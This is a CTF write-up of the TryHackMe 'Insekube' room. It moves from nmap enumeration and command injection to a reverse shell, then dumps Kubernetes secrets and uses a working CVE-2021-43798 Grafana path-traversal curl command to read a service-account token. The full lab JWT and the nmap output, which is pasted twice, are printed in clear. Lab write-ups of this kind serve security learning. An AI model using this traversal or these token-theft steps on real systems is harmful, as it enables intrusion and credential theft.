---
title: "Insekube"
date: 2022-09-20T16:00:31+01:00
draft: false
categories:
  - TryHackMe
---

{{< post-img src="insekube.png" alt="insekube" style="width: 200px;" >}}

## Enumeration


```bash
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 9f:ae:04:9e:f0:75:ed:b7:39:80:a0:d8:7f:bd:61:06 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCpKksU81PRNTKP1wxKXB9jq0Yk6id6JCuj4gYTAPk932sjBdUV4OhoMBP1m2cITHGWBWiE02KzRSkgL9X0FZL6CJRxo09N2uHXp6XT5+V+VMf1/5B1xgETNdpqgltDpqYudiKpNQzRpkvvtvCntDr+R0/4LWi7CsmII2wYFSnZ8/8UtueRCGue3Mn9oeUp1R+m5yODXfJHgcHmvHsdbx1JX/7dzwI8QSFNhnXcQwRFkRcNJBmYjlMq1SvqXQMzgR70dIv/9zfFIROPyjfLkeGsmLBEflsPmLo8Nt5CxQzUzx5w/PcnRsTv+X6syJXGjS6pD82hgPH/AtZGaNePAvcQjNPzYF2ZWB6WcMWJROMqeWYasava17FZOyEqteIsW0/JeXIZroSJT792OaGH/8nwqkLNmLE2Ab54GjunAeZEdb3MB2qeQ6iszeBCutm+CZr9HI4aRTgmfdCIRPuJJxqQeSCpLb0kNdvt36OFCmTpMMdaj9WSaFbl7Ywvd0WIVn0=
|   256 cf:cb:89:62:99:11:d7:ca:cd:5b:57:78:10:d0:6c:82 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDJH2hRXWCeM4AC7WvCY/PpWUXdSiNB+E05tW7LGCL0R6WTJLTCKpmKMWdaf3PbDMgPJlR9GzaPhOvUBFZ0uI8U=
|   256 5f:11:10:0d:7c:80:a3:fc:d1:d5:43:4e:49:f9:c8:d2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPvap+hnXqIVCd8pv3lHrx6kbI2FqAazMvM3mjg2uiE4
80/tcp open  http    syn-ack
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Date: Mon, 28 Feb 2022 16:38:06 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 1196
|     Connection: close
|     <!DOCTYPE html>
|     <head>
|     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
|     integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
|     <style>
|     body,
|     html {
|     height: 100%;
|     </style>
|     </head>
|     <body>
|     <div class="container h-100">
|     <div class="row mt-5">
|     <div class="col-12 mb-4">
|     class="text-center">Check if a website is down
|     </h3>
|     </div>
|     <form class="col-6 mx-auto" action="/">
|     <div class=" input-group">
|     <input name="hostname" value="" type="text" class="form-control" placeholder="Hostname"
|   HTTPOptions:
|     HTTP/1.1 405 Method Not Allowed
|     Date: Mon, 28 Feb 2022 16:38:06 GMT
|     Content-Type: text/plain; charset=utf-8
|     Content-Length: 18
|     Allow: GET, HEAD
|     Connection: close
|     Method Not Allowed
|   RTSPRequest:
|     HTTP/1.1 405 Method Not Allowed
|     Date: Mon, 28 Feb 2022 16:38:07 GMT
|     Content-Type: text/plain; charset=utf-8
|     Content-Length: 18
|     Allow: GET, HEAD
|     Connection: close
|_    Method Not Allowed
| http-methods:
|_  Supported Methods: GET HEAD
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.92%I=7%D=2/28%Time=621CF9BE%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,535,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Mon,\x2028\x20Feb\x20202
SF:2\x2016:38:06\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\
SF:nContent-Length:\x201196\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20ht
SF:ml>\n\n<head>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"ht
SF:tps://stackpath\.bootstrapcdn\.com/bootstrap/4\.5\.2/css/bootstrap\.min
SF:\.css\"\n\x20\x20\x20\x20\x20\x20\x20\x20integrity=\"sha384-JcKb8q3iqJ6
SF:1gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP\+VmmDGMN5t9UJ0Z\"\x20crossorigin
SF:=\"anonymous\">\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20body,\n\x20\x20\x20\x20\x20\x20\x20\x20html\x20{\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20height:\x20100%;\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20}\n\x20\x20\x20\x20</style>\n</head>\n\n<body>\n\x20\x20\x20\x
SF:20<div\x20class=\"container\x20h-100\">\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20<div\x20class=\"row\x20mt-5\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20<div\x20class=\"col-12\x20mb-4\">\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3\x20class=\"text-center\">Che
SF:ck\x20if\x20a\x20website\x20is\x20down\x20\xf0\x9f\x92\xa3</h3>\n\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20<form\x20class=\"col-6\x20mx-auto\"\x20actio
SF:n=\"/\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20<div\x20class=\"\x20input-group\">\n\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<input\x20name=\"hostna
SF:me\"\x20value=\"\"\x20type=\"text\"\x20class=\"form-control\"\x20placeh
SF:older=\"Hostname\"\n\x20\x20\x20\x20\x20\x20\x20")%r(HTTPOptions,BC,"HT
SF:TP/1\.1\x20405\x20Method\x20Not\x20Allowed\r\nDate:\x20Mon,\x2028\x20Fe
SF:b\x202022\x2016:38:06\x20GMT\r\nContent-Type:\x20text/plain;\x20charset
SF:=utf-8\r\nContent-Length:\x2018\r\nAllow:\x20GET,\x20HEAD\r\nConnection
SF::\x20close\r\n\r\nMethod\x20Not\x20Allowed")%r(RTSPRequest,BC,"HTTP/1\.
SF:1\x20405\x20Method\x20Not\x20Allowed\r\nDate:\x20Mon,\x2028\x20Feb\x202
SF:022\x2016:38:07\x20GMT\r\nContent-Type:\x20text/plain;\x20charset=utf-8
SF:\r\nContent-Length:\x2018\r\nAllow:\x20GET,\x20HEAD\r\nConnection:\x20c
SF:lose\r\n\r\nMethod\x20Not\x20Allowed");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 9f:ae:04:9e:f0:75:ed:b7:39:80:a0:d8:7f:bd:61:06 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCpKksU81PRNTKP1wxKXB9jq0Yk6id6JCuj4gYTAPk932sjBdUV4OhoMBP1m2cITHGWBWiE02KzRSkgL9X0FZL6CJRxo09N2uHXp6XT5+V+VMf1/5B1xgETNdpqgltDpqYudiKpNQzRpkvvtvCntDr+R0/4LWi7CsmII2wYFSnZ8/8UtueRCGue3Mn9oeUp1R+m5yODXfJHgcHmvHsdbx1JX/7dzwI8QSFNhnXcQwRFkRcNJBmYjlMq1SvqXQMzgR70dIv/9zfFIROPyjfLkeGsmLBEflsPmLo8Nt5CxQzUzx5w/PcnRsTv+X6syJXGjS6pD82hgPH/AtZGaNePAvcQjNPzYF2ZWB6WcMWJROMqeWYasava17FZOyEqteIsW0/JeXIZroSJT792OaGH/8nwqkLNmLE2Ab54GjunAeZEdb3MB2qeQ6iszeBCutm+CZr9HI4aRTgmfdCIRPuJJxqQeSCpLb0kNdvt36OFCmTpMMdaj9WSaFbl7Ywvd0WIVn0=
|   256 cf:cb:89:62:99:11:d7:ca:cd:5b:57:78:10:d0:6c:82 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDJH2hRXWCeM4AC7WvCY/PpWUXdSiNB+E05tW7LGCL0R6WTJLTCKpmKMWdaf3PbDMgPJlR9GzaPhOvUBFZ0uI8U=
|   256 5f:11:10:0d:7c:80:a3:fc:d1:d5:43:4e:49:f9:c8:d2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPvap+hnXqIVCd8pv3lHrx6kbI2FqAazMvM3mjg2uiE4

80/tcp open  http    syn-ack
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Date: Mon, 28 Feb 2022 16:38:06 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 1196
|     Connection: close
|     <!DOCTYPE html>
|     <head>
|     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
|     integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
|     <style>
|     body,
|     html {
|     height: 100%;
|     </style>
|     </head>
|     <body>
|     <div class="container h-100">
|     <div class="row mt-5">
|     <div class="col-12 mb-4">
|     class="text-center">Check if a website is down
|     </h3>
|     </div>
|     <form class="col-6 mx-auto" action="/">
|     <div class=" input-group">
|     <input name="hostname" value="" type="text" class="form-control" placeholder="Hostname"
|   HTTPOptions:
|     HTTP/1.1 405 Method Not Allowed
|     Date: Mon, 28 Feb 2022 16:38:06 GMT
|     Content-Type: text/plain; charset=utf-8
|     Content-Length: 18
|     Allow: GET, HEAD
|     Connection: close
|     Method Not Allowed
|   RTSPRequest:
|     HTTP/1.1 405 Method Not Allowed
|     Date: Mon, 28 Feb 2022 16:38:07 GMT
|     Content-Type: text/plain; charset=utf-8
|     Content-Length: 18
|     Allow: GET, HEAD
|     Connection: close
|_    Method Not Allowed
| http-methods:
|_  Supported Methods: GET HEAD
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.92%I=7%D=2/28%Time=621CF9BE%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,535,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Mon,\x2028\x20Feb\x20202
SF:2\x2016:38:06\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\
SF:nContent-Length:\x201196\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20ht
SF:ml>\n\n<head>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"ht
SF:tps://stackpath\.bootstrapcdn\.com/bootstrap/4\.5\.2/css/bootstrap\.min
SF:\.css\"\n\x20\x20\x20\x20\x20\x20\x20\x20integrity=\"sha384-JcKb8q3iqJ6
SF:1gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP\+VmmDGMN5t9UJ0Z\"\x20crossorigin
SF:=\"anonymous\">\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20body,\n\x20\x20\x20\x20\x20\x20\x20\x20html\x20{\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20height:\x20100%;\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20}\n\x20\x20\x20\x20</style>\n</head>\n\n<body>\n\x20\x20\x20\x
SF:20<div\x20class=\"container\x20h-100\">\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20<div\x20class=\"row\x20mt-5\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20<div\x20class=\"col-12\x20mb-4\">\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3\x20class=\"text-center\">Che
SF:ck\x20if\x20a\x20website\x20is\x20down\x20\xf0\x9f\x92\xa3</h3>\n\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20<form\x20class=\"col-6\x20mx-auto\"\x20actio
SF:n=\"/\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20<div\x20class=\"\x20input-group\">\n\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<input\x20name=\"hostna
SF:me\"\x20value=\"\"\x20type=\"text\"\x20class=\"form-control\"\x20placeh
SF:older=\"Hostname\"\n\x20\x20\x20\x20\x20\x20\x20")%r(HTTPOptions,BC,"HT
SF:TP/1\.1\x20405\x20Method\x20Not\x20Allowed\r\nDate:\x20Mon,\x2028\x20Fe
SF:b\x202022\x2016:38:06\x20GMT\r\nContent-Type:\x20text/plain;\x20charset
SF:=utf-8\r\nContent-Length:\x2018\r\nAllow:\x20GET,\x20HEAD\r\nConnection
SF::\x20close\r\n\r\nMethod\x20Not\x20Allowed")%r(RTSPRequest,BC,"HTTP/1\.
SF:1\x20405\x20Method\x20Not\x20Allowed\r\nDate:\x20Mon,\x2028\x20Feb\x202
SF:022\x2016:38:07\x20GMT\r\nContent-Type:\x20text/plain;\x20charset=utf-8
SF:\r\nContent-Length:\x2018\r\nAllow:\x20GET,\x20HEAD\r\nConnection:\x20c
SF:lose\r\n\r\nMethod\x20Not\x20Allowed");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Now there is some obvious command injection
The flag is in an environment variable so we check those!
there is a command for that

```bash
ping: usage error: Destination address required
KUBERNETES_SERVICE_PORT_HTTPS=443
GRAFANA_SERVICE_HOST=10.108.133.228
KUBERNETES_SERVICE_PORT=443
HOSTNAME=syringe-79b66d66d7-7mxhd
SYRINGE_PORT=tcp://10.99.16.179:3000
GRAFANA_PORT=tcp://10.108.133.228:3000
SYRINGE_SERVICE_HOST=10.99.16.179
SYRINGE_PORT_3000_TCP=tcp://10.99.16.179:3000
GRAFANA_PORT_3000_TCP=tcp://10.108.133.228:3000
PWD=/home/challenge
SYRINGE_PORT_3000_TCP_PROTO=tcp
HOME=/home/challenge
KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
GOLANG_VERSION=1.15.7
FLAG=flag{flag_for_warming_up_real_quick}
SHLVL=1
SYRINGE_PORT_3000_TCP_PORT=3000
GRAFANA_PORT_3000_TCP_PORT=3000
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
GRAFANA_SERVICE_PORT=3000
SYRINGE_PORT_3000_TCP_ADDR=10.99.16.179
SYRINGE_SERVICE_PORT=3000
KUBERNETES_SERVICE_HOST=10.96.0.1
KUBERNETES_PORT=tcp://10.96.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
GRAFANA_PORT_3000_TCP_PROTO=tcp
PATH=/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
GRAFANA_PORT_3000_TCP_ADDR=10.108.133.228
_=/usr/bin/env

```
Get access (Reverse shell much)

Get to the the [kubectl](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux) in /tmp

```bash
└──╼ $nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 53060
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
challenge@syringe-79b66d66d7-7mxhd:~$ cd /tmp
cd /tmp
challenge@syringe-79b66d66d7-7mxhd:/tmp$ ls
ls
kubectl
challenge@syringe-79b66d66d7-7mxhd:/tmp$
```
Now try interacting (just follow up) and get Secrets

```bash
challenge@syringe-79b66d66d7-7mxhd:/tmp$ ./kubectl get secrets
./kubectl get secrets
NAME                    TYPE                                  DATA   AGE
default-token-8bksk     kubernetes.io/service-account-token   3      52d
developer-token-74lck   kubernetes.io/service-account-token   3      52d
secretflag              Opaque                                1      52d
syringe-token-g85mg     kubernetes.io/service-account-token   3      52d

challenge@syringe-79b66d66d7-7mxhd:/tmp$ ./kubectl get secret secretflag -o 'json'
<xhd:/tmp$ ./kubectl get secret secretflag -o 'json'
{
    "apiVersion": "v1",
    "data": {
        "flag": "ZmxhZ3tzZWNyZXRmbGFnX2Zvcl9rdWJlcnVzZXJzfQ=="
    },
    "kind": "Secret",
    "metadata": {
        "annotations": {
            "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"data\":{\"flag\":\"ZmxhZ3tkZjJhNjM2ZGUxNTEwOGE0ZGM0MTEzNWQ5MzBkOGVjMX0=\"},\"kind\":\"Secret\",\"metadata\":{\"annotations\":{},\"name\":\"secretflag\",\"namespace\":\"default\"},\"type\":\"Opaque\"}\n"
        },
        "creationTimestamp": "2022-01-06T23:41:19Z",
        "name": "secretflag",
        "namespace": "default",
        "resourceVersion": "562",
        "uid": "6384b135-4628-4693-b269-4e50bfffdf21"
    },
    "type": "Opaque"
}

```
Flag is in obvious base64 encoding (duh)
Now we try to get in with Grafana!
use `curl` in the shell as grafana is only available locally (port forward would feel like overkill)

```bash
challenge@syringe-79b66d66d7-7mxhd:/tmp$ curl http://grafana:3000
curl http://grafana:3000
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    29  100    29    0     0   9666      0 --:--:-- --:--:-- --:--:--  9666
<a href="/login">Found</a>.
```

```bash
challenge@syringe-79b66d66d7-7mxhd:/tmp$ curl http://10.108.133.228:3000/login/
<-7mxhd:/tmp$ curl http://10.108.133.228:3000/login/
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed

...

[REDACTED = REMOVED THE MAD LONG OUTPUT LMAO]

1637855786,"commit":"8d74cc357","edition":"Enterprise","env":"production","hasUpdate":false,"hideVersion":false,"isEnterprise":false,"latestVersion":"","version":"8.3.0-beta2"},"caching":

...

```

Now you got your [CVE](https://nvd.nist.gov/vuln/detail/CVE-2021-43798) exploit it!

[This guy](https://j0vsec.com/post/cve-2021-43798/) explains it!

```bash
challenge@syringe-79b66d66d7-7mxhd:/tmp$ curl --path-as-is http://grafana:3000/public/plugins/alertlist/../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token
</var/run/secrets/kubernetes.io/serviceaccount/token
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1022  100  1022    0     0   199k      0 --:--:-- --:--:-- --:--:--  199k
eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3NjA3OTAzLCJpYXQiOjE2NDYwNzE5MDMsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NDYwNzU1MTB9LCJuYmYiOjE2NDYwNzE5MDMsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.nddXlHiH68jofQOhTnj_uZDs5RRdeDAhfuMcz5eNwS_W-Xz0UZ9ayml5jq3CIqW7Mlja6PnyVn_wQ1ls4ovIBjDXx_P5oVrGydxqXTjiCT2VpH6EIDMBFTawGguQb4NPsdYOuzlEBOfzat_C5EoSNzvVu3_U3n4HYweZtJ87ErlNKRiuRGI16umI3yR2YRD7gdxV1OwNVG7BcQ6sb6Bh0hJKdpGRBFMH6uYp0Nmr8v7jCY5XATw_P0i9381sERMwyHlrpfuymXl9sxQW53b1OcjyKE6ywvy-hjkbPI2difM8Xqbs-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw

```
that is a long JWT token (you should put it in a file...I won't but you should)

```bash
challenge@syringe-79b66d66d7-7mxhd:/tmp$ ./kubectl auth can-i --list --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3NjA3OTAzLCJpYXQiOjE2NDYwNzE5MDMsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NDYwNzU1MTB9LCJuYmYiOjE2NDYwNzE5MDMsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.nddXlHiH68jofQOhTnj_uZDs5RRdeDAhfuMcz5eNwS_W-Xz0UZ9ayml5jq3CIqW7Mlja6PnyVn_wQ1ls4ovIBjDXx_P5oVrGydxqXTjiCT2VpH6EIDMBFTawGguQb4NPsdYOuzlEBOfzat_C5EoSNzvVu3_U3n4HYweZtJ87ErlNKRiuRGI16umI3yR2YRD7gdxV1OwNVG7BcQ6sb6Bh0hJKdpGRBFMH6uYp0Nmr8v7jCY5XATw_P0i9381sERMwyHlrpfuymXl9sxQW53b1OcjyKE6ywvy-hjkbPI2difM8Xqbs-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw
<bPI2difM8Xqbs-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw
Resources                                       Non-Resource URLs                     Resource Names   Verbs
*.*                                             []                                    []               [*]
                                                [*]                                   []               [*]
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]

...

```
I directly go to the shell part...I can't keep pasting this long token

```bash
challenge@syringe-79b66d66d7-7mxhd:/tmp$ ./kubectl get pods --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3NjA3OTAzLCJpYXQiOjE2NDYwNzE5MDMsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NDYwNzU1MTB9LCJuYmYiOjE2NDYwNzE5MDMsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.nddXlHiH68jofQOhTnj_uZDs5RRdeDAhfuMcz5eNwS_W-Xz0UZ9ayml5jq3CIqW7Mlja6PnyVn_wQ1ls4ovIBjDXx_P5oVrGydxqXTjiCT2VpH6EIDMBFTawGguQb4NPsdYOuzlEBOfzat_C5EoSNzvVu3_U3n4HYweZtJ87ErlNKRiuRGI16umI3yR2YRD7gdxV1OwNVG7BcQ6sb6Bh0hJKdpGRBFMH6uYp0Nmr8v7jCY5XATw_P0i9381sERMwyHlrpfuymXl9sxQW53b1OcjyKE6ywvy-hjkbPI2difM8Xqbs-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw
<bPI2difM8Xqbs-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw
NAME                       READY   STATUS    RESTARTS       AGE
grafana-57454c95cb-v4nrk   1/1     Running   10 (28d ago)   52d
syringe-79b66d66d7-7mxhd   1/1     Running   1 (28d ago)    28d
```
Do what you could not now

```bash
challenge@syringe-79b66d66d7-7mxhd:/tmp$ ./kubectl get services --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3NjA3OTAzLCJpYXQiOjE2NDYwNzE5MDMsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NDYwNzU1MTB9LCJuYmYiOjE2NDYwNzE5MDMsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.nddXlHiH68jofQOhTnj_uZDs5RRdeDAhfuMcz5eNwS_W-Xz0UZ9ayml5jq3CIqW7Mlja6PnyVn_wQ1ls4ovIBjDXx_P5oVrGydxqXTjiCT2VpH6EIDMBFTawGguQb4NPsdYOuzlEBOfzat_C5EoSNzvVu3_U3n4HYweZtJ87ErlNKRiuRGI16umI3yR2YRD7gdxV1OwNVG7BcQ6sb6Bh0hJKdpGRBFMH6uYp0Nmr8v7jCY5XATw_P0i9381sERMwyHlrpfuymXl9sxQW53b1OcjyKE6ywvy-hjkbPI2difM8Xqbs-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw
<bPI2difM8Xqbs-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw
NAME         TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)          AGE
grafana      NodePort    10.108.133.228   <none>        3000:30411/TCP   52d
kubernetes   ClusterIP   10.96.0.1        <none>        443/TCP          52d
syringe      NodePort    10.99.16.179     <none>        3000:30000/TCP   52d

